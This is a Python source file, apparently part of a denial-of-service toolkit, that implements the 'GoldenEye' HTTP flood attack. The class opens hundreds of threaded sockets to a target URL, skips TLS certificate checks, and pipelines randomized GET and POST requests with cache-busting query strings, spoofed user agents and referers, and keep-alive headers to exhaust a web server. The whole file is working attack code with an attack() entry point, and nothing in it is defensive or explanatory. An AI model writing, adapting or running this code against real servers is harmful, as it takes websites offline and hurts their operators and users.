import socket
import ssl
import random
import threading
import time
from urllib.parse import urlparse
from core.useragent import UserAgent

class GoldenEye:
    def __init__(self, url, threads=100, sockets=500, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.is_ssl = parsed.scheme == 'https'
        self.path = parsed.path or '/'
        self.threads = threads
        self.sockets_per = sockets // 5
        self.duration = duration
        self.stats = stats
        self.running = False
    
    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                s.connect((self.host, self.port))
                
                if self.is_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                
                # Pipeline multiple requests
                for _ in range(self.sockets_per):
                    if not self.running: break
                    method = random.choice(['GET', 'POST'])
                    query = random.randint(1000, 999999)
                    ua = UserAgent.random_agent()
                    ref = UserAgent.random_referer()
                    
                    req = (
                        f"{method} {self.path}?{query} HTTP/1.1\r\n"
                        f"Host: {self.host}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Referer: {ref}\r\n"
                        f"Accept-Encoding: gzip, deflate\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Keep-Alive: {random.randint(110, 120)}\r\n"
                        f"\r\n"
                    )
                    s.sendall(req.encode())
                    
                    if self.stats:
                        self.stats.increment_sent()
                        self.stats.add_bytes(len(req))
                
                s.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
    
    def attack(self):
        self.running = True
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        self.running = False
